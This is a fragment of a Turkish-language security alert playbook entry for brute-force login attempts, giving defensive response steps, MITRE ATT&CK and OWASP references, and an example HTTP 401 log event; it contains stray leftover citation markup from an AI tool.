    - "Hatalı giriş denemeleri alan kullanıcı hesaplarını belirleyin; başarılı bir giriş olmuş mu hemen ardından kontrol edin. Eğer hesap kilitlendi (lockout) olduysa, kilitlenme politikalarınız işini yapmıştır."
    - "Kaynak IP adresine bakın; eğer tek bir IP'den çok sayıda hesaba deneme yapıldıysa net bir brute force aracıdır, IP'yi engelleyin. Sadece tek bir hesaba deneme varsa o hesap hedeflenmiş, kullanıcıyı uyarın ve parolasını sıfırlayın."
    - "Uygulama tarafında bu durumu engellemek için ek önlemler (CAPTCHA, lockout, MFA) uygulayın; ayrıca WAF'inizde belli sayıda hata alınınca IP'yi bloklayacak kural oluşturun."
    - "Benzer brute force girişimleri geçmişte de olmuş mu logları tarayın; belki geniş çaplı bir parola tahmin kampanyasının parçasıdır, diğer servislerinizin (VPN, SMTP vs.) loglarını da gözden geçirin."
  references:
    - "MITRE ATT&CK T1110.001: Saldırganlar hiçbir kimlik bilgisine sahip olmadığında parola tahmini yaparlar; bu genellikle belirgin sayıda hatalı deneme ile anlaşılır:contentReference[oaicite:49]{index=49}:contentReference[oaicite:50]{index=50}"
    - "OWASP Brute Force Prevention: Hesap kilitleme ve IP engelleme politikaları, bir IP'den gelen çoklu hatalı denemeleri durdurmayı amaçlar; bu alarm, bu mekanizmaların devrede olması gerektiğini hatırlatır."
  example_event: |
    {
      "@timestamp": "2025-10-03T16:25:00.000Z",
      "source.ip": "203.0.113.111",
      "http.request.method": "POST",
      "url.path": "/login",
      "http.response.status_code": 401,
      "user_agent.original": "Mozilla/5.0",
      "host.name": "AppServer-Login"
    }
  short_explanation: "203.0.113.111 IP adresi /login sayfasına art arda hatalı girişler yaptı (HTTP 401 döndü). Alarmı aldıktan sonra, bu IP'yi geçici olarak engelleyin ve hedeflenen kullanıcı hesaplarının parolalarını değiştirip ek güvenlik (MFA) uygulayın."

